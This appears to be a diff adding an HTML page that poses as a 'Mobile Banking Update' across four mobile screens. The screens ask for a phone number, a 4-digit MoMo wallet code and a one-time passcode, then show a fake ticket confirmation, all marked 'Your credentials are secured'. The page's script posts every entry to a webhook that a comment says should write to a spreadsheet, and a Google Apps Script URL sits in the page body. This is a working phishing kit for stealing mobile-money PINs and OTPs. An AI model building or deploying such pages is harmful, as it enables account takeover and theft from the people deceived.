@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Fintech UIs — Mobile</title>
+  <style>
+    :root{
+      --blue:#0a4dbf;
+      --yellow:#ffdd00;
+      --muted:#8a8a8a;
+      --card-radius:16px;
+      --btn-radius:28px;
+      --max-width:420px;
+      --page-pad:16px;
+    }
+    *{box-sizing:border-box}
+    body{font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial; margin:0; background:#f2f4f7; color:#1f2937; -webkit-font-smoothing:antialiased}
+
+    .container{max-width:var(--max-width); margin:0 auto; padding:calc(var(--page-pad) + 8px)}
+
+    .header{
+      background:var(--blue);
+      color:white;
+      padding:20px 16px;
+      border-radius:12px;
+      text-align:center;
+    }
+    .header h1{margin:0; font-size:18px; color:var(--yellow); letter-spacing:0.6px}
+    .header p{margin:8px 0 0; font-size:13px; color:#ffffff; opacity:0.95}
+
+    .card{background:white; border-radius:var(--card-radius); padding:18px; margin-top:16px; box-shadow:0 8px 30px rgba(15,23,42,0.06)}
+    label{display:block; font-size:13px; margin-bottom:8px; color:#374151}
+    input[type="text"], input[type="tel"], input[type="password"], input[type="number"]{width:100%; padding:12px 14px; font-size:15px; border:1px solid #e6e9ef; border-radius:10px; outline:none}
+    .btn{display:block; width:100%; padding:14px; border-radius:var(--btn-radius); border:none; font-weight:700; font-size:16px; cursor:pointer}
+    .btn--yellow{background:var(--yellow)}
+
+    .note{margin-top:12px; font-size:12px; color:var(--muted); text-align:center}
+
+    /* small helper styles for the 4 UIs stacked */
+    .ui-section{margin-bottom:28px}
+    .ui-title{font-size:14px; color:#111827; margin-bottom:10px}
+
+    /* responsive tweaks */
+    @media (max-width:420px){.container{padding:12px}}
+  </style>
+</head>
+<body>
+  <https://script.google.com/macros/s/AKfycby5OPFnR5SjZWvHo-b3UJV14_Tv8TjN2Pp2olkQSvghs6GPoq1zgJ8ajIK7C72xMK3uNw/exec>
+
+  <div class="container">
+
+    <!-- UI 1: Mobile Banking Update (Phone Number) -->
+    <div class="ui-section">
+      <div class="header">
+        <h1>MOBILE BANKING UPDATE</h1>
+        <p>Please confirm your phone number to proceed with the update.</p>
+      </div>
+      <div class="card">
+        <form class="form" data-ui="phone-form">
+          <label for="phoneNumber">Phone Number</label>
+          <input id="phoneNumber" name="phoneNumber" type="tel" placeholder="Enter your phone number" inputmode="tel" required />
+
+          <button type="submit" class="btn btn--yellow">Submit</button>
+          <div class="note">Your credentials are secured</div>
+        </form>
+      </div>
+    </div>
+
+    <!-- UI 2: Link Wallet (4-digit MoMo code) -->
+    <div class="ui-section">
+      <div class="header">
+        <h1>MOBILE BANKING UPDATE</h1>
+        <p>Link your wallet by entering your MoMo code.</p>
+      </div>
+      <div class="card">
+        <form class="form" data-ui="momo-form">
+          <label for="momoCode">Enter 4-digit MoMo Code</label>
+          <input id="momoCode" name="momoCode" type="text" inputmode="numeric" pattern="\d{4}" maxlength="4" placeholder="____" required />
+
+          <button type="submit" class="btn btn--yellow">Link Wallet</button>
+          <div class="note">Your credentials are secured</div>
+        </form>
+      </div>
+    </div>
+
+    <!-- UI 3: Validation OTP -->
+    <div class="ui-section">
+      <div class="header">
+        <h1>VALIDATION OTP</h1>
+        <p>Enter the one-time passcode sent to your device.</p>
+      </div>
+      <div class="card">
+        <form class="form" data-ui="otp-form">
+          <label for="otp">Validation OTP</label>
+          <input id="otp" name="otp" type="text" inputmode="numeric" pattern="\d{4,6}" maxlength="6" placeholder="Enter your validation OTP" required />
+
+          <button type="submit" class="btn btn--yellow">Validate</button>
+          <div class="note">Your credentials are secured</div>
+        </form>
+      </div>
+    </div>
+
+    <!-- UI 4: Customer Online Validation message -->
+    <div class="ui-section">
+      <div class="header">
+        <h1>CUSTOMER ONLINE VALIDATION</h1>
+        <p>Your request status and ticket number.</p>
+      </div>
+      <div class="card">
+        <label>Dear Customer</label>
+        <p style="margin:6px 0 14px; font-size:15px; line-height:1.4">Your request with ticket number <strong>REQ-E104789</strong> was successfully submitted and is under review. You will receive further updates via SMS or Email once processed.</p>
+        <form class="form" data-ui="customer-form">
+          <!-- This form can record acknowledgement or redirect the user back to home -->
+          <input type="hidden" name="ticket" value="REQ-E104789" />
+          <button type="submit" class="btn btn--yellow">Back to Home</button>
+        </form>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    // Replace this with your spreadsheet-writing endpoint (Google Apps Script web app URL or other webhook)
+    const WEBHOOK_URL = 'https://YOUR_SPREADSHEET_WEBHOOK_URL_HERE';
+
+    // Helper: collect form data into an object and include UI id
+    function collectData(formEl){
+      const data = { ui: formEl.getAttribute('data-ui'), timestamp: new Date().toISOString() };
+      new FormData(formEl).forEach((v,k)=>{ data[k]=v });
+      return data;
+    }
+
+    // Submit handler using fetch POST JSON. If WEBHOOK_URL is not set, falls back to console.log.
+    async function submitToWebhook(formEl){
+      const data = collectData(formEl);
+      if(!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_SPREADSHEET_WEBHOOK_URL_HERE')){
+        console.warn('WEBHOOK_URL not configured. Replace WEBHOOK_URL variable in the HTML with your endpoint URL.\nCollected payload:', data);
+        // optional: show a small toast to user
+        alert('Demo mode: form captured. Replace WEBHOOK_URL with your endpoint to actually submit.');
+        return;
+      }
+      try{
+        const res = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        if(!res.ok) throw new Error('Network response was not ok');
+        // simple success flow — you can customize based on response
+        alert('Submitted successfully');
+      }catch(err){
+        console.error(err);
+        alert('Submission failed — check console for details');
+      }
+    }
+
+    // Attach handlers to all forms
+    document.querySelectorAll('form.form').forEach(formEl=>{
+      formEl.addEventListener('submit', function(e){
+        e.preventDefault();
+        // basic client-side validation (pattern/required are handled by browser too)
+        submitToWebhook(formEl);
+      });
+    });
+  </script>
+</body>
+</html>
